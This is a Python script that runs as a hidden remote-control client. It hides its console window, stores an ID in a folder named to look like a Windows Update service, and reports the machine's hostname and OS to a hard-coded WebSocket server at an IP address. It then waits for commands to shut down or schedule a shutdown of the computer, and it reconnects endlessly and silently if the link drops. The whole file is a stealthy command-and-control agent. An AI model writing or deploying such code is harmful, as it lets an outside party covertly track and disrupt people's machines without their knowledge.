import websocket
import json
import time
import os
import sys
import platform
import uuid
import threading
import ctypes
import subprocess

SERVER_URL = "ws://118.178.170.93:3000"
DATA_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'WindowsUpdateService')

def get_device_id():
    id_file = os.path.join(DATA_DIR, 'device_id.txt')
    try:
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
    except:
        pass
    
    os.makedirs(DATA_DIR, exist_ok=True)
    new_id = str(uuid.uuid4())[:8]
    try:
        with open(id_file, 'w') as f:
            f.write(new_id)
    except:
        pass
    return new_id

DEVICE_ID = get_device_id()

def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_system_info():
    return {
        "os": platform.system(),
        "hostname": platform.node()
    }

def shutdown_computer(delay_seconds=0):
    if delay_seconds > 0:
        time.sleep(delay_seconds)
    
    if platform.system() == "Windows":
        subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, creationflags=0x08000000)
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        os.system("shutdown -h now")

def schedule_shutdown(seconds):
    timer = threading.Timer(seconds, shutdown_computer)
    timer.daemon = True
    timer.start()

def cancel_scheduled_shutdown():
    if platform.system() == "Windows":
        subprocess.run(["shutdown", "/a"], shell=True, creationflags=0x08000000)

def on_message(ws, message):
    try:
        data = json.loads(message)
        
        if data.get("type") == "command":
            command = data.get("command")
            params = data.get("params", {})
            
            if command == "shutdown":
                delay = params.get("delay", 0)
                shutdown_computer(delay)
            elif command == "schedule_shutdown":
                seconds = params.get("seconds", 0)
                schedule_shutdown(seconds)
            elif command == "cancel_shutdown":
                cancel_scheduled_shutdown()
    except:
        pass

def on_error(ws, error):
    pass

def on_close(ws, close_status_code, close_msg):
    time.sleep(5)
    connect()

def on_open(ws):
    ws.send(json.dumps({
        "type": "register",
        "deviceId": DEVICE_ID,
        "info": get_system_info()
    }))
    
    def heartbeat():
        while True:
            try:
                ws.send(json.dumps({"type": "heartbeat"}))
                time.sleep(30)
            except:
                break
    
    threading.Thread(target=heartbeat, daemon=True).start()

def connect():
    while True:
        try:
            ws = websocket.WebSocketApp(
                SERVER_URL,
                on_message=on_message,
                on_error=on_error,
                on_close=on_close
            )
            ws.on_open = on_open
            ws.run_forever()
        except:
            time.sleep(5)

if __name__ == "__main__":
    hide_console()
    connect()